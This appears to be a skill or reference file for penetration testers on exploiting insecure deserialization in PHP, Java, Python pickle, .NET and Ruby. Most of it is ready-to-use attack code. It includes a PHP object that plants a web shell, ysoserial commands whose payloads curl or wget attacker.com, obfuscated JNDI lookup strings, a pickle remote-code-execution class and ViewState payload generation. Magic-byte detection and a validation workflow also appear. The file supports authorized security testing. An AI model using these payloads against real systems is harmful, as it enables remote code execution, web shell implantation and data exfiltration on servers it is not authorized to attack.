---
name: insecure_deserialization
description: Insecure deserialization exploitation - PHP, Java (ysoserial), Python pickle, Ruby Marshal, .NET; gadget chain identification, detection
---

# Insecure Deserialization

Insecure deserialization occurs when user-controlled serialized objects are deserialized without validation. Object graphs with "gadget chains" execute arbitrary code during deserialization by chaining magic methods / reflection calls that ultimately reach OS exec or file write primitives.

## Attack Surface

**Entry Points**
- Session cookies (base64/hex-encoded serialized object)
- Hidden form fields containing serialized state
- `ViewState` (ASP.NET) and `__VIEWSTATE` parameters
- HTTP API body/headers carrying serialized payloads
- Binary protocol messages (Java remoting, .NET Remoting)
- Deserialized cache data (Memcached, Redis storing serialized objects)
- JWT/OAuth tokens with serialized claims

## Magic Byte Signatures

Identify serialized data by format markers:

| Language/Format | Magic Bytes | Base64 Prefix |
|----------------|-------------|---------------|
| Java (ObjectOutputStream) | `AC ED 00 05` | `rO0AB` |
| PHP serialize() | starts with `O:` or `a:` | — |
| Python pickle | `80 04 95` (v4) / `80 02` (v2) | — |
| .NET BinaryFormatter | `00 01 00 00 00` | `AAEAAAD` |
| Ruby Marshal | `04 08` | `BAg=` |

Quick check:
```bash
echo "rO0AB..." | base64 -d | xxd | head -2
# AC ED 00 05 = Java serialization magic
```

## PHP Object Injection

### Magic Methods

| Method | Triggered by |
|--------|-------------|
| `__wakeup()` | `unserialize()` call |
| `__destruct()` | Object garbage collected |
| `__toString()` | Object cast to string |
| `__get($name)` | Access undefined property |
| `__call($name, $args)` | Call undefined method |
| `__invoke($args)` | Object called as function |

### Craft Malicious Object

```php
<?php
class FileWriter {
    public $filename;
    public $data;
    public function __destruct() {
        file_put_contents($this->filename, $this->data);
    }
}

$obj = new FileWriter();
$obj->filename = "/var/www/html/shell.php";
$obj->data = "<?php system(\$_GET['cmd']); ?>";
echo serialize($obj);
// O:10:"FileWriter":2:{s:8:"filename";s:24:"/var/www/html/shell.php";s:4:"data";s:29:"<?php system($_GET['cmd']); ?>";}
```

### Phar Deserialization (PHP)

```php
# Phar archives trigger unserialize() on metadata access
# Affects file functions: file_exists(), is_file(), copy(), unlink()
phar:///uploads/evil.phar/test.txt

# Build
<?php
$p = new Phar('/tmp/evil.phar');
$p->startBuffering();
$p->setStub('<?php __HALT_COMPILER();');
$p->setMetadata(new EvilClass());
$p->addFromString('test.txt', 'test');
$p->stopBuffering();
```

## Java Deserialization

### ysoserial Gadget Chains

```bash
# List available payloads
java -jar ysoserial.jar

# Common gadget chains
java -jar ysoserial.jar CommonsCollections6 'id > /tmp/pwn' | base64 -w0
java -jar ysoserial.jar Groovy1 'curl http://attacker.com/$(id)' | base64 -w0
java -jar ysoserial.jar Spring1 'wget http://attacker.com/shell.sh -O /tmp/s.sh' | base64 -w0
java -jar ysoserial.jar URLDNS 'http://attacker.collaborator.io' | base64 -w0
# URLDNS = DNS-only, ideal for safe blind detection

# Send via curl
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0)
curl -s -X POST https://example.com/api/v1/object \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary "@<(echo $PAYLOAD | base64 -d)"
```

### Java JNDI Injection (Log4Shell-style)

```
# If Java object triggers JNDI lookup:
${jndi:ldap://attacker.com:1389/exploit}
${${lower:j}ndi:${lower:ldap}://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:rmi://attacker.com/exploit}
```

### Detection via URLDNS

```bash
# Safe detection — only triggers DNS lookup, no code execution
java -jar ysoserial.jar URLDNS 'http://BURP_COLLABORATOR_ID.burpcollaborator.net' | base64 -w0
# Send to target, monitor DNS in Burp Collaborator or interactsh
```

## Python Pickle

```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pickle_pwn',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
# Send as cookie or POST body wherever pickle.loads() is called
```

Detect pickle by looking for `__reduce__` patterns or magic bytes `80 04 95` / `80 02`.

## .NET BinaryFormatter / ViewState

```powershell
# ysoserial.net for .NET gadget chains
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe"
ysoserial.exe -f ViewState -g TypeConfuseDelegate -c "powershell -enc BASE64_CMD" \
  --path "/default.aspx" --apppath "/" --decryptionalg AES \
  --decryptionkey FOUND_KEY --validationalg SHA1 --validationkey FOUND_KEY
```

Look for `__VIEWSTATE` in ASP.NET forms. If `EnableViewStateMac=false` and `ViewStateEncryptionMode=Never`, it's vulnerable without key.

## Ruby Marshal

```ruby
# Marshal.load without verification
require 'base64'

# Craft payload exploiting ActiveRecord/Rails gadgets
# Use "universal_rce_ruby_serialize" gem or manual chain:
payload = Marshal.dump(Gem::SpecFetcher.new)
puts Base64.encode64(payload)
```

## Validation Approach

1. Identify serialized data: magic bytes check + base64 decode + `xxd | head`
2. Start with safe OOB-only payload: URLDNS (Java), DNS-only pickle (Python)
3. Confirm callback received in collaborator/interactsh
4. Escalate to command execution with `id` output in DNS suffix or OOB HTTP
5. Document: payload used → proxy request ID → evidence of execution

## Tools

- `ysoserial.jar` — Java gadget chains
- `ysoserial.net` — .NET gadget chains
- `PHPGGC` — PHP object injection chains
- `marshalsec` — Java RMI/JNDI redirect
- Burp Collaborator / `interactsh-client` — OOB callback detection
